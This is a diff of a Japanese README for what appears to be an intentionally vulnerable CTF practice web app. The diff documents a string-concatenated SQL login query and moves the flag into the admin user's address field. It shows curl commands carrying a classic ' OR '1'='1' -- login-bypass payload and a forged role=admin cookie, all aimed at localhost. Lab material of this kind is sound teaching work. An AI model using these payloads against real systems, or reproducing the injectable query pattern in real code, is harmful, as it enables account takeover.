@@ -76,13 +76,15 @@ curl -b "session=<ログイン後のsession値>; role=admin" http://localhost:80
 ログインクエリを文字列結合で構築（パラメータバインディング不使用）。
 DB seed順序を「admin → customer1」にしてあるため、全行に一致するinjectionは
 `fetchone()` で **admin（id=1）** を返す。admin のパスワードはランダム値で
-通常ログイン不可。
+通常ログイン不可。フラグはadminユーザーの`address`列（マイページの「お届け先住所」欄）に
+DBレコードとして持たせてある。
 
 **攻略手順**
 ```
 curl -i -c cookies.txt --data-urlencode "username=' OR '1'='1' -- " -d "password=x" http://localhost:8000/login
+curl -b cookies.txt http://localhost:8000/mypage
 ```
-ログイン成功画面（`login_success_admin.html`）に直接フラグが表示される。
+ログインは通常フローと同じく`/mypage`にリダイレクトされ、「お届け先住所」欄にフラグが表示される。
 
 ---
 
